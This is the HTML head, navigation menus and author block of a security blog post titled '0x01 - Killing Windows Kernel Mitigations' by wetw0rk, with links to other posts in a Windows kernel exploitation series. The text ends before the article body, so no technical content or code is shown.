<!DOCTYPE html>
<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
  data-auto-appearance="true"><head>
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>0x01 - Killing Windows Kernel Mitigations &middot; Blowfish</title>
  <meta name="title" content="0x01 - Killing Windows Kernel Mitigations &middot; Blowfish" />
  
  
  
  
  
  <link rel="canonical" href="/posts/0x01-killing-windows-kernel-mitigations/" />
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.1c9cd0d1ebaf117272b5c4f6bd49878475cb210d5e0da4f061632d779f5bb46851881c187e6e634dba5071c4e3d80e7d5cec1dd80443b2fa68acd358f9eda881.css"
    integrity="sha512-HJzQ0euvEXJytcT2vUmHhHXLIQ1eDaTwYWMtd59btGhRiBwYfm5jTbpQccTj2A59XOwd2ARDsvporNNY&#43;e2ogQ==" />
  
  
  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.52b8d61b061c90a738102a0eac69eaa1479fdf5de882a0b0741d7515240617156a6c4477fcc91f9c962062804fe62d2932bb9f57d0aded208c762c2e1ed2e202.js"
    integrity="sha512-UrjWGwYckKc4ECoOrGnqoUef313ogqCwdB11FSQGFxVqbER3/MkfnJYgYoBP5i0pMrufV9Ct7SCMdiwuHtLiAg==" data-copy="" data-copied=""></script>
  
  
  
  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
  
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
  <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="/posts/0x01-killing-windows-kernel-mitigations/">
  <meta property="og:site_name" content="Blowfish">
  <meta property="og:title" content="0x01 - Killing Windows Kernel Mitigations">
  <meta property="og:description" content="This post was made possible through hard work and determination.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-12-07T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-12-07T00:00:00+00:00">

  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="0x01 - Killing Windows Kernel Mitigations">
  <meta name="twitter:description" content="This post was made possible through hard work and determination.">

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "0x01 - Killing Windows Kernel Mitigations",
    "headline": "0x01 - Killing Windows Kernel Mitigations",
    
    "abstract": "This post was made possible through hard work and determination.",
    "inLanguage": "en",
    "url" : "\/posts\/0x01-killing-windows-kernel-mitigations\/",
    "author" : {
      "@type": "Person",
      "name": "wetw0rk"
    },
    "copyrightYear": "2024",
    "dateCreated": "2024-12-07T00:00:00\u002b00:00",
    "datePublished": "2024-12-07T00:00:00\u002b00:00",
    
    "dateModified": "2024-12-07T00:00:00\u002b00:00",
    
    
    
    "mainEntityOfPage": "true",
    "wordCount": "3663"
  }]
  </script>


  
  
  <meta name="author" content="wetw0rk" />
  
  
  
  <link href="https://bsky.app/profile/wetw0rk7.bsky.social" rel="me" />
  
  
  <link href="https://github.com/wetw0rk" rel="me" />
  
  
  <link href="https://www.linkedin.com/in/milton-wetw0rk/" rel="me" />
  
  
  <link href="https://x.com/wetw0rk7" rel="me" />
  
  
  
  

<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>






















  
  



  
  
  <meta name="theme-color"/>
  
  
</head>
<body
  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
  <div id="the-top" class="absolute flex self-center">
    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
      href="#main-content"><span
        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
  </div>
  
  
  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3">
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            
            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Blowfish</a>
            

        </nav>
        <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">

            
            
            
  <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        Home
    </p>
</a>



            
             
  <div>
  <div class="cursor-pointer flex items-center nested-menu">
    
    <a  class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
      Study Cases
    </a>
    <span>
      

  <span class="relative block icon">
    <svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>

  </span>


    </span>
  </div>
  <div class="absolute menuhide">
    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
      <div class="flex flex-col space-y-3">
        
        <a href="/posts/ezekielswheel/ezekielswheel/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            Ezekiels Wheel (Hells Gate Analysis)
          </p>
        </a>
        
      </div>
    </div>
  </div>
</div>



            
             
  <div>
  <div class="cursor-pointer flex items-center nested-menu">
    
    <a  class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
      Windows Kernel Exploitation Series
    </a>
    <span>
      

  <span class="relative block icon">
    <svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>

  </span>


    </span>
  </div>
  <div class="absolute menuhide">
    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
      <div class="flex flex-col space-y-3">
        
        <a href="/posts/0x00-introduction-to-windows-kernel-exploitation/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x00 - Introduction To Windows-Kernel Exploitation
          </p>
        </a>
        
        <a href="/posts/0x01-killing-windows-kernel-mitigations/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x01 - Killing Windows Kernel Mitigations
          </p>
        </a>
        
        <a href="/posts/0x02-introduction-to-windows-kernel-uafs/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x02 - Introduction to Windows Kernel Use After Frees
          </p>
        </a>
        
        <a href="/posts/0x03-approaching-the-modern-windows-kernel-heap/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x03 - Approaching the Modern Windows Kernel Heap
          </p>
        </a>
        
        <a href="/posts/0x04-writing-what-where-in-the-kernel/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x04 - Introduction To Windows Kernel Write What Where
          </p>
        </a>
        
        <a href="/posts/0x05-introduction-to-windows-kernel-type-confusion-vulnerabilities/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x05 - Introduction to Windows Kernel Type Confusion Vulnerabilities
          </p>
        </a>
        
        <a href="/posts/0x06-approaching-modern-windows-kernel-type-confusions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x06 - Approaching Modern Windows Kernel Type Confusions
          </p>
        </a>
        
        <a href="/posts/0x07-introduction-to-windows-kernel-race-conditions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x07 - Introduction to Windows Kernel Race Conditions
          </p>
        </a>
        
        <a href="/posts/0x08-modern-windows-kernel-race-conditions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x08 - Modern Windows Kernel Race Conditions
          </p>
        </a>
        
        <a href="/posts/0x09-return-of-the-stack-overflow/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x09 - Return of The Stack Overflow
          </p>
        </a>
        
      </div>
    </div>
  </div>
</div>



            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            
            <div
                class=" flex items-center">
                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
                    <div class="flex items-center justify-center dark:hidden">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                    </div>
                    <div class="items-center justify-center hidden dark:flex">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                    </div>
                </button>
            </div>
            

        </nav>
        <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            
            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
                <div class="flex items-center justify-center dark:hidden">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                </div>
                <div class="items-center justify-center hidden dark:flex">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                </div>
            </button>
            

        </div>
    </div>
    <div class="-my-2 md:hidden">

        <label id="menu-button" class="block">
            
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" style="padding-top:5px;"
                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li id="menu-close-button">
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    

                    
  <li class="mt-1">
    <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Home
        </p>
    </a>
</li>




                    

                     
  <li class="mt-1">
    <a href="" class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Study Cases
        </p>
        <span>
            

  <span class="relative block icon">
    <svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>

  </span>


        </span>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/ezekielswheel/ezekielswheel/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            Ezekiels Wheel (Hells Gate Analysis)
        </p>
    </a>
</li>

<li class="mb-2"></li>




                    

                     
  <li class="mt-1">
    <a href="" class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Windows Kernel Exploitation Series
        </p>
        <span>
            

  <span class="relative block icon">
    <svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>

  </span>


        </span>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x00-introduction-to-windows-kernel-exploitation/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x00 - Introduction To Windows-Kernel Exploitation
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x01-killing-windows-kernel-mitigations/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x01 - Killing Windows Kernel Mitigations
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x02-introduction-to-windows-kernel-uafs/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x02 - Introduction to Windows Kernel Use After Frees
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x03-approaching-the-modern-windows-kernel-heap/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x03 - Approaching the Modern Windows Kernel Heap
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x04-writing-what-where-in-the-kernel/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x04 - Introduction To Windows Kernel Write What Where
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x05-introduction-to-windows-kernel-type-confusion-vulnerabilities/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x05 - Introduction to Windows Kernel Type Confusion Vulnerabilities
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x06-approaching-modern-windows-kernel-type-confusions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x06 - Approaching Modern Windows Kernel Type Confusions
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x07-introduction-to-windows-kernel-race-conditions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x07 - Introduction to Windows Kernel Race Conditions
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x08-modern-windows-kernel-race-conditions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x08 - Modern Windows Kernel Race Conditions
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x09-return-of-the-stack-overflow/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x09 - Return of The Stack Overflow
        </p>
    </a>
</li>

<li class="mb-2"></li>




                    

                </ul>
                
                

            </div>
        </label>
    </div>
</div>





  
  <div class="relative flex flex-col grow">
    <main id="main-content" class="grow">
      


<article>
  

  <header id="single_header" class="mt-5 max-w-prose">
    
    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
      0x01 - Killing Windows Kernel Mitigations
    </h1>
    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
      





  
  













  













<div class="flex flex-row flex-wrap items-center">
  
  
  <span title="Reading time">18 mins</span>
  

  
  
</div>








    </div>

    
    
    
    
    

    

    
      
      
        
        
<div class="flex author">
  
    
    
      
    
    
      
        
      
      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
      alt="wetw0rk" src="/img/me_hu16849291692863915239.png" />
    
  
  <div class="place-self-center">
    
    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
      Author
    </div>
    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
      wetw0rk
    </div>
    
    
    <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://bsky.app/profile/wetw0rk7.bsky.social"
          target="_blank"
          aria-label="Bluesky"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256,232.562c-21.183,-41.196 -78.868,-117.97 -132.503,-155.834c-51.378,-36.272 -70.978,-29.987 -83.828,-24.181c-14.872,6.72 -17.577,29.554 -17.577,42.988c0,13.433 7.365,110.138 12.169,126.281c15.873,53.336 72.376,71.358 124.413,65.574c2.66,-0.395 5.357,-0.759 8.089,-1.097c-2.68,0.429 -5.379,0.796 -8.089,1.097c-76.259,11.294 -143.984,39.085 -55.158,137.972c97.708,101.165 133.908,-21.692 152.484,-83.983c18.576,62.291 39.972,180.718 150.734,83.983c83.174,-83.983 22.851,-126.674 -53.408,-137.969c-2.71,-0.302 -5.409,-0.667 -8.089,-1.096c2.732,0.337 5.429,0.702 8.089,1.096c52.037,5.785 108.54,-12.239 124.413,-65.574c4.804,-16.142 12.169,-112.847 12.169,-126.281c-0,-13.434 -2.705,-36.267 -17.577,-42.988c-12.85,-5.806 -32.45,-12.09 -83.829,24.181c-53.634,37.864 -111.319,114.635 -132.502,155.831Z"/></svg>
  </span>

</span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/wetw0rk"
          target="_blank"
          aria-label="Github"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>

</span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://www.linkedin.com/in/milton-wetw0rk/"
          target="_blank"
          aria-label="Linkedin"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>

  </span>

</span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://x.com/wetw0rk7"
          target="_blank"
          aria-label="X-Twitter"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
  </span>

</span></a
        >
      
    
  </div>

</div>
  </div>
</div>

      

      

      
